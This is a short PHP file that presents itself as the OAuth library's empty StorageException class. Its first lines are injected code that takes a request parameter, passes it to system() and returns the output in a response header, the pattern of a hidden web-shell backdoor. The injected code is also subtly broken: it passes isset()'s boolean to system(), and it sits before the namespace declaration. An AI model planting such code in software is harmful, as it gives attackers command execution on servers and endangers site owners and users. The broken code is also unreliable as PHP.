<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\Common\Storage\Exception;

use OAuth\Common\Exception\Exception;

/**
 * Generic storage exception.
 */
class StorageException extends Exception
{
}
